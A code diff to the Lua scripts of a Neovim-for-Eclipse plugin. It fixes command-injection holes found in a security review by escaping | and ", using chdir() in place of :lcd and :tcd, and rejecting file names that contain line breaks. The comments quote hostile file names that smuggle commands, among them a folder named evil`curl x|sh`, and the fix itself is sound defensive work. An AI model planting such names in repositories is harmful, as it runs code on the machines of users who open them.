@@ -550,7 +550,17 @@ final class LuaScripts {
               end
               local cmd = 'Eclipse' .. (p.bang and '!' or '') .. ' ' .. p.cmd
               if #args > 0 then
-                cmd = cmd .. ' ' .. table.concat(args, ' ') -- as typed: a name keeps its backslashes
+                -- As typed: a name keeps its backslashes (one before a space or a %), but
+                -- nvim_parse_cmd took away the one before | and ", so it goes back. :Eclipse takes a
+                -- | after it (bar = true): without the backslash, a cloned repository's file named
+                -- x|lua(os.execute)(...) ran that Lua when its name was completed into :e and Enter
+                -- pressed (0.2.1 security review), and a " began a comment. :Eclipse gets the
+                -- backslashed | and " back as | and ", as any command marked -bar does.
+                local typed_args = {}
+                for i, a in ipairs(args) do
+                  typed_args[i] = (a:gsub('[|"]', '\\\\%0'))
+                end
+                cmd = cmd .. ' ' .. table.concat(typed_args, ' ')
               end
               return cmd
             end
@@ -924,8 +934,12 @@ final class LuaScripts {
                 -- :w ++p) is skipped, keeping the copied one. Silent: Neovim echoes the new folder,
                 -- a message that would replace the one the user is reading (the write message of
                 -- the :w that just opened another editor, say).
+                -- chdir(), not :lcd: a command's argument goes through file-name expansion, where
+                -- `...` runs a shell command, so a project folder named evil`curl x|sh` would run it
+                -- the moment one of its files opened (0.2.1 security review). chdir() takes the name
+                -- as it is, and says nothing.
                 if folder ~= nil and folder ~= '' and not vim.o.autochdir and vim.fn.isdirectory(folder) == 1 then
-                  pcall(vim.cmd.lcd, { args = { folder }, mods = { silent = true } })
+                  pcall(vim.fn.chdir, folder, 'window')
                 end
               end)
               return win
@@ -1422,6 +1436,15 @@ final class LuaScripts {
               -- BufReadCmd of their own, defined before this one): the buffer is theirs.
               local first = vim.api.nvim_buf_get_lines(buf, 0, 1, false)[1]
               if not vim.bo[buf].modifiable or vim.api.nvim_buf_line_count(buf) > 1 or (first and first ~= '') then
+                return
+              end
+              -- A line break in the name would split the :read below into two commands: fnameescape()
+              -- puts a backslash before it but leaves it in, and vim.cmd() runs each line on its own,
+              -- so a cloned repository's file named "x<newline>lua=os.execute(...)" ran that Lua when
+              -- Neovim loaded it (0.2.1 security review). Such a file is not read.
+              if name:find('[\\r\\n]') then
+                vim.api.nvim_echo({ { 'Neovim for Eclipse does not read a file whose name has a line break: '
+                  .. vim.inspect(name), 'ErrorMsg' } }, true, {})
                 return
               end
               local saved = vim.bo[buf].undolevels
@@ -2963,7 +2986,13 @@ final class LuaScripts {
                   local file = vim.b[b].neovim4eclipse_file
                   if canonical(vim.api.nvim_buf_get_name(b)) ~= canonical(file) then
                     vim.api.nvim_buf_call(b, function()
-                      vim.cmd('keepalt noautocmd file ' .. vim.fn.fnameescape(file))
+                      if file:find('[\\r\\n]') then
+                        -- Not through :file: a line break would split the command in two (see the
+                        -- read hook in PROJECT_FILES); the API takes the name as it is.
+                        pcall(vim.api.nvim_buf_set_name, b, file)
+                      else
+                        vim.cmd('keepalt noautocmd file ' .. vim.fn.fnameescape(file))
+                      end
                     end)
                     if not quiet then
                       fail('file: Eclipse names this buffer after its file; use :saveas or File > Save As')
@@ -3199,7 +3228,6 @@ final class LuaScripts {
             end
             local refuge = vim.fs.dirname(vim.fs.normalize(folder))
             local function kept(dir) return inside(dir) and refuge or dir end
-            local silent = { silent = true }
             local moved = 0
             local tabs, wins = {}, {}
             for _, tab in ipairs(vim.api.nvim_list_tabpages()) do
@@ -3225,7 +3253,8 @@ final class LuaScripts {
               if inside(dir) then moved = moved + 1 end
               vim.api.nvim_win_call(win, function()
                 if scope_cwd() ~= dir or target ~= dir then
-                  pcall(vim.cmd[command], { args = { target }, mods = silent })
+                  -- chdir(), not :tcd/:lcd, which would expand `...` in the name as a shell command
+                  pcall(vim.fn.chdir, target, command == 'tcd' and 'tabpage' or 'window')
                 end
               end)
             end
